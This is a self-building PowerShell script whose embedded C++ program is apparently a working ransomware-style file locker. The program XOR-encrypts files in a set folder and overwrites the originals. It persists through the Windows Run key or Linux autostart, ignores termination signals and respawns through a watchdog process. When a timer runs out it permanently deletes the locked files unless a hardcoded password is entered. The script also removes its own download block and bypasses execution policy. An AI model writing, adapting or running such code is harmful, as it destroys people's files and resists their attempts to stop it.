# winlock_setup.ps1
if (Get-Item -Path $PSCommandPath -Stream "Zone.Identifier" -ErrorAction SilentlyContinue) {
    Write-Host "Removing file block..." -ForegroundColor Yellow
    Unblock-File -Path $PSCommandPath
    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Wait
    exit
}
Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

# ── Compiler detection & installation ─────────────────────────────────────
$script:CompilerType = $null
$script:CompilerPath = $null
$script:PortableDir  = Join-Path $PSScriptRoot "mingw-portable"

function Refresh-EnvPath {
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path", "Machine") + ";" +
                [System.Environment]::GetEnvironmentVariable("Path", "User")
}

function Test-Gpp {
    param([string]$Path = "g++")
    try { & $Path --version 2>&1 | Out-Null; return $LASTEXITCODE -eq 0 }
    catch { return $false }
}

function Find-PortableGpp {
    $candidates = @(
        (Join-Path $script:PortableDir "mingw64\bin\g++.exe"),
        (Join-Path $script:PortableDir "bin\g++.exe")
    )
    foreach ($c in $candidates) { if (Test-Path $c) { return $c } }
    return $null
}

function Install-ViaWinget {
    if (-not (Get-Command winget -ErrorAction SilentlyContinue)) { return $false }
    Write-Host "      [winget] Attempting MinGW install..." -ForegroundColor DarkGray
    try {
        $ids = @("MINGW.MINGW", "Genivia.MINGW-W64")
        foreach ($id in $ids) {
            winget install --id $id --silent --accept-package-agreements --accept-source-agreements 2>&1 | Out-Null
            Refresh-EnvPath
            if (Test-Gpp) { return $true }
        }
    } catch {}
    return $false
}

function Install-ViaChocolatey {
    Write-Host "      [choco] Attempting MinGW install..." -ForegroundColor DarkGray
    try {
        if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
            Write-Host "      [choco] Installing Chocolatey first..." -ForegroundColor DarkGray
            Set-ExecutionPolicy Bypass -Scope Process -Force
            [System.Net.ServicePointManager]::SecurityProtocol = `
                [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
            Invoke-Expression ((New-Object System.Net.WebClient).DownloadString(
                'https://community.chocolatey.org/install.ps1'))
            Refresh-EnvPath
        }
        choco install mingw -y --no-progress 2>&1 | Out-Null
        Refresh-EnvPath
        if (Test-Gpp) { return $true }
    } catch {}
    return $false
}

function Install-ViaDownload {
    Write-Host "      [download] Fetching portable MinGW (~80 MB). Please wait..." -ForegroundColor DarkGray
    try {
        $url     = "https://github.com/brechtsanders/winlibs_mingw/releases/download/" +
                   "13.2.0posix-17.0.6-11.0.1-ucrt-r5/" +
                   "winlibs-x86_64-posix-seh-gcc-13.2.0-mingw-w64ucrt-11.0.1-r5.zip"
        $zipPath = Join-Path $env:TEMP "mingw-portable.zip"

        Invoke-WebRequest -Uri $url -OutFile $zipPath -UseBasicParsing
        Write-Host "      [download] Extracting..." -ForegroundColor DarkGray
        Expand-Archive -Path $zipPath -DestinationPath $script:PortableDir -Force
        Remove-Item $zipPath -ErrorAction SilentlyContinue

        $found = Find-PortableGpp
        if ($found) {
            $script:CompilerType = "gcc"
            $script:CompilerPath = $found
            $env:Path = (Split-Path $found) + ";" + $env:Path
            return $true
        }
    } catch {
        Write-Host "      [download] Failed: $_" -ForegroundColor DarkRed
    }
    return $false
}

function Get-Compiler {
    # 1 — System g++
    if (Test-Gpp) {
        $script:CompilerType = "gcc"
        $script:CompilerPath = (Get-Command g++).Source
        Write-Host "      System g++ -> $($script:CompilerPath)" -ForegroundColor DarkGray
        return $true
    }
    # 2 — System cl (MSVC)
    if (Get-Command cl -ErrorAction SilentlyContinue) {
        $script:CompilerType = "msvc"
        $script:CompilerPath = "cl"
        Write-Host "      System cl.exe (MSVC)" -ForegroundColor DarkGray
        return $true
    }
    # 3 — Portable MinGW next to this script
    $portable = Find-PortableGpp
    if ($portable) {
        $script:CompilerType = "gcc"
        $script:CompilerPath = $portable
        Write-Host "      Portable g++ -> $portable" -ForegroundColor DarkGray
        return $true
    }
    # 4 — Install: winget → choco → direct download
    Write-Host "      No compiler found. Installing..." -ForegroundColor Yellow
    if (Install-ViaWinget) {
        $script:CompilerType = "gcc"
        $script:CompilerPath = (Get-Command g++).Source
        return $true
    }
    if (Install-ViaChocolatey) {
        $script:CompilerType = "gcc"
        $script:CompilerPath = (Get-Command g++).Source
        return $true
    }
    if (Install-ViaDownload) { return $true }
    return $false
}

function Invoke-Compile {
    param([string]$Source, [string]$Output)
    if ($script:CompilerType -eq "gcc") {
        & $script:CompilerPath $Source -o $Output -std=c++17 -pthread -ladvapi32
    } elseif ($script:CompilerType -eq "msvc") {
        cl $Source /std:c++17 /EHsc /Fe:$Output /link advapi32.lib
    }
    return $LASTEXITCODE -eq 0
}
# ──────────────────────────────────────────────────────────────────────────

$source = @'
#include <iostream>
#include <fstream>
#include <filesystem>
#include <chrono>
#include <thread>
#include <string>
#include <iomanip>
#include <vector>
#include <algorithm>
#include <future>
#ifdef _WIN32
    #include <windows.h>
    #include <conio.h>
#else
    #include <termios.h>
    #include <unistd.h>
    #include <sys/select.h>
    #include <fcntl.h>
    #include <signal.h>
    #include <limits.h>
#endif

namespace fs = std::filesystem;

// ==========================================
// Constants
// ==========================================
const std::string ADMIN_PASSWORD        = "admin123";
#ifdef _WIN32
const std::string TARGET_PATH           = "C:\\Users\\Public\\pupy";
#else
const std::string TARGET_PATH           = "/home/yigit/pupy";
#endif
const int         LOCK_DURATION_SECONDS = 300;
const std::string CRYPTO_KEY            = "Fast_XOR_Key_2026";

#ifdef _WIN32
const char* REG_APP_KEY = "Software\\TimedFileLock";
#else
const std::string CONFIG_DIR     = std::string(getenv("HOME")) + "/.config/timedfilelock";
const std::string CONFIG_FILE    = CONFIG_DIR + "/endtime";
const std::string AUTOSTART_FILE = std::string(getenv("HOME")) + "/.config/autostart/timedfilelock.desktop";
#endif
// ==========================================

#ifdef _WIN32
static DWORD g_watchdogPID = 0;
#else
static pid_t g_watchdogPID = 0;
#endif

#ifndef _WIN32
static struct termios orig_termios;
static bool rawModeActive = false;

void disableRawMode() {
    if (rawModeActive) { tcsetattr(STDIN_FILENO, TCSAFLUSH, &orig_termios); rawModeActive = false; }
}
void enableRawMode() {
    tcgetattr(STDIN_FILENO, &orig_termios);
    atexit(disableRawMode);
    struct termios raw = orig_termios;
    raw.c_lflag &= ~(ECHO | ICANON | ISIG);
    raw.c_cc[VMIN] = 0; raw.c_cc[VTIME] = 0;
    tcsetattr(STDIN_FILENO, TCSAFLUSH, &raw);
    rawModeActive = true;
}
bool kbhit() {
    fd_set fds; FD_ZERO(&fds); FD_SET(STDIN_FILENO, &fds);
    struct timeval tv = {0, 0};
    return select(STDIN_FILENO + 1, &fds, NULL, NULL, &tv) > 0;
}
int getch() { unsigned char c = 0; if (read(STDIN_FILENO, &c, 1) < 1) return -1; return c; }
#endif

#ifdef _WIN32
void enableAnsiSupport() {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (hOut == INVALID_HANDLE_VALUE) return;
    DWORD mode = 0; GetConsoleMode(hOut, &mode);
    SetConsoleMode(hOut, mode | ENABLE_VIRTUAL_TERMINAL_PROCESSING);
}
BOOL WINAPI ConsoleHandler(DWORD signal) {
    switch (signal) {
        case CTRL_C_EVENT: case CTRL_BREAK_EVENT: case CTRL_CLOSE_EVENT:
        case CTRL_LOGOFF_EVENT: case CTRL_SHUTDOWN_EVENT: return TRUE;
    }
    return FALSE;
}
#else
void signalHandler(int) {}
#endif

#ifdef _WIN32
void spawnWatchdog() {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    std::string args = std::string(exePath) + " --watchdog " + std::to_string(GetCurrentProcessId());
    STARTUPINFOA si = { sizeof(si) }; PROCESS_INFORMATION pi;
    CreateProcessA(exePath, args.data(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    g_watchdogPID = pi.dwProcessId;
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
}
#else
void spawnWatchdog() {
    char exePath[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", exePath, sizeof(exePath) - 1);
    if (len == -1) return;
    exePath[len] = '\0';
    std::string pidStr = std::to_string(getpid());
    pid_t pid = fork();
    if (pid == 0) {
        setsid();
        int devnull = open("/dev/null", O_RDWR);
        if (devnull >= 0) {
            dup2(devnull, STDIN_FILENO); dup2(devnull, STDOUT_FILENO); dup2(devnull, STDERR_FILENO);
            close(devnull);
        }
        execl(exePath, exePath, "--watchdog", pidStr.c_str(), nullptr);
        _exit(1);
    }
    g_watchdogPID = pid;
}
void relaunchInTerminal(const char* exePath) {
    const char* terms[] = {"gnome-terminal", "xfce4-terminal", "konsole", "xterm", nullptr};
    for (int i = 0; terms[i]; ++i) {
        std::string cmd = terms[i];
        std::string arg = (cmd == "gnome-terminal") ? " -- " : " -e ";
        std::string full = cmd + arg + "\"" + exePath + "\" &";
        if (system(full.c_str()) == 0) return;
    }
}
#endif

void killWatchdog() {
#ifdef _WIN32
    if (g_watchdogPID != 0) {
        HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, g_watchdogPID);
        if (h) { TerminateProcess(h, 0); CloseHandle(h); }
        g_watchdogPID = 0;
    }
#else
    if (g_watchdogPID != 0) { kill(g_watchdogPID, SIGTERM); g_watchdogPID = 0; }
#endif
}

void setAutostartAndTimer(long long targetEndTime) {
#ifdef _WIN32
    HKEY hRunKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &hRunKey) == ERROR_SUCCESS) {
        char exePath[MAX_PATH]; GetModuleFileNameA(NULL, exePath, MAX_PATH);
        RegSetValueExA(hRunKey, "TimedFileLockProgram", 0, REG_SZ,
                       (BYTE*)exePath, (DWORD)(strlen(exePath) + 1));
        RegCloseKey(hRunKey);
    }
    HKEY hAppKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, REG_APP_KEY, 0, NULL,
            REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hAppKey, NULL) == ERROR_SUCCESS) {
        LONG res = RegSetValueExA(hAppKey, "EndTime", 0, REG_QWORD,
                                  (const BYTE*)&targetEndTime, sizeof(targetEndTime));
        if (res != ERROR_SUCCESS)
            std::cerr << "Warning: Failed to write EndTime to registry. Error: " << res << "\n";
        RegCloseKey(hAppKey);
    } else {
        std::cerr << "Warning: Failed to create registry key.\n";
    }
#else
    fs::create_directories(CONFIG_DIR);
    std::ofstream f(CONFIG_FILE); if (f) f << targetEndTime;
    char exePath[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", exePath, sizeof(exePath) - 1);
    if (len != -1) {
        exePath[len] = '\0';
        fs::create_directories(fs::path(AUTOSTART_FILE).parent_path());
        std::ofstream desktop(AUTOSTART_FILE);
        if (desktop)
            desktop << "[Desktop Entry]\nType=Application\nName=TimedFileLock\n"
                    << "Exec=" << exePath << "\nHidden=false\nNoDisplay=false\n"
                    << "X-GNOME-Autostart-enabled=true\n";
    }
#endif
}

void cleanSettings() {
#ifdef _WIN32
    HKEY hRunKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &hRunKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hRunKey, "TimedFileLockProgram");
        RegCloseKey(hRunKey);
    }
    RegDeleteKeyA(HKEY_CURRENT_USER, REG_APP_KEY);
#else
    fs::remove(CONFIG_FILE); fs::remove(AUTOSTART_FILE); fs::remove(CONFIG_DIR);
#endif
}

long long getSavedEndTime() {
#ifdef _WIN32
    HKEY hKey; long long endTime = 0; DWORD dataSize = sizeof(endTime);
    if (RegOpenKeyExA(HKEY_CURRENT_USER, REG_APP_KEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD dwType = 0;
        if (RegQueryValueExA(hKey, "EndTime", NULL, &dwType,
                             (LPBYTE)&endTime, &dataSize) == ERROR_SUCCESS)
            if (dwType != REG_QWORD) endTime = 0;
        RegCloseKey(hKey);
    }
    return endTime;
#else
    std::ifstream f(CONFIG_FILE); long long endTime = 0; if (f) f >> endTime; return endTime;
#endif
}

bool secureDelete(const fs::path& filePath) {
    std::error_code ec;
    uintmax_t fileSize = fs::file_size(filePath, ec);
    if (!ec && fileSize > 0) {
        std::ofstream file(filePath, std::ios::binary | std::ios::in | std::ios::out);
        if (file.is_open()) {
            constexpr size_t BLOCK_SIZE = 4096;
            std::vector<char> zeroBuffer(BLOCK_SIZE, 0);
            uintmax_t written = 0;
            while (written < fileSize) {
                uintmax_t toWrite = std::min((uintmax_t)zeroBuffer.size(), fileSize - written);
                file.write(zeroBuffer.data(), toWrite);
                written += toWrite;
            }
            file.flush(); file.close();
        }
    }
    fs::remove(filePath, ec);
    return !ec;
}

void processSingleFile(const fs::path& filePath, bool encrypt) {
    fs::path newPath = filePath;
    if (encrypt) newPath += ".locked"; else newPath.replace_extension("");

    std::ifstream inFile(filePath, std::ios::binary);
    if (!inFile) return;
    std::ofstream outFile(newPath, std::ios::binary);
    if (!outFile) { inFile.close(); return; }

    constexpr size_t BUFFER_SIZE = 4 * 1024 * 1024;
    std::vector<char> buffer(BUFFER_SIZE);
    size_t keyIndex = 0;
    const size_t keySize = CRYPTO_KEY.size();
    if (keySize == 0) return;

    while (inFile) {
        inFile.read(buffer.data(), BUFFER_SIZE);
        std::streamsize bytesRead = inFile.gcount();
        if (bytesRead == 0) break;
        for (std::streamsize i = 0; i < bytesRead; ++i) {
            buffer[i] ^= CRYPTO_KEY[keyIndex];
            if (++keyIndex >= keySize) keyIndex = 0;
        }
        outFile.write(buffer.data(), bytesRead);
        if (!outFile) {
            inFile.close(); outFile.close(); fs::remove(newPath); return;
        }
    }
    inFile.close(); outFile.close();
    secureDelete(filePath);
}

void processFiles(const fs::path& targetPath, bool encrypt) {
    std::error_code ec;
    if (!fs::exists(targetPath, ec)) return;

    auto options = fs::directory_options::skip_permission_denied;
    auto it  = fs::recursive_directory_iterator(targetPath, options, ec);
    auto end = fs::recursive_directory_iterator();
    if (ec) return;

    const unsigned int maxConcurrency = std::thread::hardware_concurrency() > 0
                                       ? std::thread::hardware_concurrency() : 4;
    std::vector<std::future<void>> futures;

    while (it != end) {
        if (ec) { ec.clear(); it.increment(ec); continue; }
        try {
            const auto& entry = *it;
            if (entry.is_regular_file(ec) && !ec) {
                const auto currentPath = entry.path();
                bool isLocked = (currentPath.extension() == ".locked");
                if ((encrypt && !isLocked) || (!encrypt && isLocked)) {
                    if (futures.size() >= maxConcurrency * 2) {
                        for (auto& f : futures)
                            if (f.valid()) { try { f.get(); } catch (...) {} }
                        futures.clear();
                    }
                    futures.push_back(
                        std::async(std::launch::async, processSingleFile, currentPath, encrypt));
                }
            }
        } catch (...) {}
        it.increment(ec);
    }
    for (auto& f : futures)
        if (f.valid()) { try { f.get(); } catch (...) {} }
}

void destroyLockedFiles(const fs::path& targetPath) {
    std::error_code ec;
    if (!fs::exists(targetPath, ec)) return;
    std::vector<fs::path> targets;
    for (const auto& entry : fs::recursive_directory_iterator(targetPath, ec)) {
        if (ec) { ec.clear(); continue; }
        if (!entry.is_regular_file()) continue;
        if (entry.path().extension() == ".locked") targets.push_back(entry.path());
    }
    for (const auto& path : targets) secureDelete(path);
}

bool hasLockedFiles(const fs::path& targetPath) {
    std::error_code ec;
    if (!fs::exists(targetPath, ec)) return false;
    for (const auto& entry : fs::recursive_directory_iterator(targetPath, ec)) {
        if (ec) { ec.clear(); continue; }
        if (!entry.is_regular_file()) continue;
        if (entry.path().extension() == ".locked") return true;
    }
    return false;
}

#ifdef _WIN32
int main() {
    enableAnsiSupport();
    SetConsoleCtrlHandler(ConsoleHandler, TRUE);

    if (__argc == 3 && std::string(__argv[1]) == "--watchdog") {
        DWORD parentPID = std::stoul(__argv[2]);
        HANDLE hParent = OpenProcess(SYNCHRONIZE, FALSE, parentPID);
        if (hParent) { WaitForSingleObject(hParent, INFINITE); CloseHandle(hParent); }
        char exePath[MAX_PATH]; GetModuleFileNameA(NULL, exePath, MAX_PATH);
        STARTUPINFOA si = { sizeof(si) }; PROCESS_INFORMATION pi;
        CreateProcessA(exePath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        return 0;
    }
    if (__argc == 2 && std::string(__argv[1]) == "--reset") {
        std::cout << "Resetting: decrypting files...\n";
        processFiles(TARGET_PATH, false);
        killWatchdog();
        cleanSettings();
        std::cout << "Done. Registry and autostart entry removed.\n";
        std::this_thread::sleep_for(std::chrono::seconds(2));
        return 0;
    }
#else
int main(int argc, char* argv[]) {
    signal(SIGINT, signalHandler); signal(SIGTERM, signalHandler); signal(SIGHUP, signalHandler);
    if (argc == 3 && std::string(argv[1]) == "--watchdog") {
        pid_t parentPID = static_cast<pid_t>(std::stoul(argv[2]));
        while (kill(parentPID, 0) == 0)
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
        char exePath[PATH_MAX];
        ssize_t len = readlink("/proc/self/exe", exePath, sizeof(exePath) - 1);
        if (len != -1) { exePath[len] = '\0'; relaunchInTerminal(exePath); }
        return 0;
    }
    if (argc == 2 && std::string(argv[1]) == "--reset") {
        std::cout << "Resetting: decrypting files...\n";
        processFiles(TARGET_PATH, false);
        killWatchdog();
        cleanSettings();
        std::cout << "Done. Config and autostart entry removed.\n";
        std::this_thread::sleep_for(std::chrono::seconds(2));
        return 0;
    }
#endif

    spawnWatchdog();
    std::cout << "--- Timed File Lock System ---\n";

    long long now     = std::chrono::duration_cast<std::chrono::seconds>(
                            std::chrono::system_clock::now().time_since_epoch()).count();
    long long endTime = getSavedEndTime();

    if (endTime != 0 && !hasLockedFiles(TARGET_PATH)) { cleanSettings(); endTime = 0; }

    if (endTime == 0) {
        endTime = now + LOCK_DURATION_SECONDS;
        setAutostartAndTimer(endTime);
        processFiles(TARGET_PATH, true);
        std::cout << "Files locked and added to system startup!\n\n";
    } else {
        std::cout << "Previous locked session found, resuming...\n\n";
    }

    int remaining = static_cast<int>(endTime - now);
    if (remaining < 0) remaining = 0;

    std::string inputBuffer, statusMsg;
    bool isUnlocked = false;

#ifndef _WIN32
    enableRawMode();
#endif

    while (remaining > 0 && !isUnlocked) {
#ifdef _WIN32
        if (_kbhit()) { int ch = _getch();
#else
        if (kbhit())  { int ch = getch();
#endif
            if (ch == '\n' || ch == '\r') {
                if (inputBuffer == ADMIN_PASSWORD) { isUnlocked = true; break; }
                else { statusMsg = " [!] Wrong password!"; inputBuffer.clear(); }
            } else if (ch == 127 || ch == '\b') {
                if (!inputBuffer.empty()) inputBuffer.pop_back();
            } else if (ch >= 32 && ch <= 126) {
                inputBuffer += static_cast<char>(ch); statusMsg = "";
            }
        }
        now = std::chrono::duration_cast<std::chrono::seconds>(
                  std::chrono::system_clock::now().time_since_epoch()).count();
        remaining = static_cast<int>(endTime - now);
        if (remaining < 0) remaining = 0;
        int mins = remaining / 60, secs = remaining % 60;
        std::cout << "\r\033[K" << "Time left: "
                  << std::setfill('0') << std::setw(2) << mins << ":"
                  << std::setfill('0') << std::setw(2) << secs
                  << " | Password: " << std::string(inputBuffer.size(), '*')
                  << statusMsg << std::flush;
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }

#ifndef _WIN32
    disableRawMode();
#endif

    if (isUnlocked) {
        std::cout << "\n\nUNLOCKING...\n";
        processFiles(TARGET_PATH, false);
        killWatchdog(); cleanSettings();
        std::cout << "All files decrypted and system cleaned up!\n";
    } else {
        std::cout << "\n\nTIME IS UP! DESTROYING LOCKED FILES...\n";
        destroyLockedFiles(TARGET_PATH);
        killWatchdog(); cleanSettings();
        std::cout << "All locked files permanently destroyed!\n";
    }

    std::this_thread::sleep_for(std::chrono::seconds(3));
    return 0;
}
'@

Set-Content -Path "winlock.cpp" -Value $source -Encoding UTF8
Write-Host "[1/4] winlock.cpp created." -ForegroundColor Green

Write-Host "[2/4] Finding compiler..." -ForegroundColor Cyan
if (-not (Get-Compiler)) {
    Write-Host "ERROR: Could not find or install a compiler." -ForegroundColor Red
    Write-Host "  MinGW  : https://www.mingw-w64.org/"
    Write-Host "  MSYS2  : https://www.msys2.org/"
    Write-Host "  MSVC   : https://visualstudio.microsoft.com/visual-cpp-build-tools/"
    exit 1
}
Write-Host "      Compiler ready." -ForegroundColor Green

Write-Host "[3/4] Compiling..." -ForegroundColor Cyan
if (-not (Invoke-Compile "winlock.cpp" "winwipe.exe")) {
    Write-Host "ERROR: Compilation failed." -ForegroundColor Red
    exit 1
}
Write-Host "      Compilation successful -> winwipe.exe" -ForegroundColor Green

Write-Host "[4/4] Launching..." -ForegroundColor Cyan
Write-Host ""
.\winwipe.exe
Remove-Item winlock.cpp -ErrorAction SilentlyContinue
